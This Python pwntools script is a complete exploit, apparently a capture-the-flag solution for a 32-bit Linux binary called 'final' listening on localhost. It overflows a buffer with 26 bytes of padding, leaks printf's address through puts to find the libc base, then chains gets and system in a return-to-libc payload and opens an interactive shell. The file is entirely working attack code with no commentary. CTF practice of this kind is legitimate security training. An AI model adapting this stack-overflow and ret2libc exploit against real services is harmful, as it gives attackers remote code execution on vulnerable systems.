#!/usr/bin/python

from pwn import *
from pwnlib.log import *

# setting 
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
elf = ELF("final")
libc = ELF("libc.so.6")

# trigger vuln
r = remote("localhost", 5566)
r.recvuntil("\n")
r.send("\n")

# leak libc
puts = p32(elf.symbols["puts"])
exit = p32(elf.symbols["exit"])
puts_arg1 = p32(elf.got["printf"])
ret = p32(0x08048c76)
payload = "a"*26 + puts + ret + puts_arg1
payload += "\n"
r.send(payload)
leak = u32(r.recv()[:4])
info('printf = %x' % leak)
base = leak - libc.symbols["printf"]
info('libc_base = %x' % base)
libc.address += base 

gets = p32(libc.symbols["gets"])
system = p32(libc.symbols["system"])
buf = p32(0x804b500)
payload = "a"*26 + gets + system + buf + buf
payload += "\n"
r.send(payload)
r.recvuntil("\n")

r.interactive()

